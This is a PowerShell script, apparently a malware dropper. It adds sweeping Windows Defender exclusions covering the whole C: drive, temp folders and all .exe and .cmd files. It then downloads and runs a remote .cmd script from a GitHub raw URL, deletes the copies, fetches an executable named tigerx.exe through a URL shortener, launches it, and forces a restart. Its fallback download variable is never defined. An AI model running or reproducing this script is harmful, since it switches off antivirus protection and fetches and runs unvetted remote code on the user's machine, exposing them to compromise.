Add-MpPreference -ExclusionPath "C:*","tigerx.exe","C:\Windows\Temp\",".cmd",".exe","$env:TEMP"
add-mppreference -exclusionprocess $env:TEMP
add-mppreference -exclusionprocess tigerx.exe
add-mppreference -exclusionprocess C:\Windows\Temp\

Start-Sleep -Seconds 5

$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/Pctoolsbox/tigerx/refs/heads/main/wdd.cmd'

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\wdd_$rand.cmd" } else { "$env:TEMP\wdd_$rand.cmd" }

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
}

$ScriptArgs = "$args "
$prefix = "@REM $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\wdd*.cmd", "$env:SystemRoot\Temp\wdd*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }

Start-Sleep -Seconds 5

$url = "https://is.gd/tigerxgit"
$outpath = "C:\Windows\Temp\tigerx.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "C:\Windows\Temp\tigerx.exe" -ArgumentList $args

Start-Sleep -Seconds 30

Restart-Computer
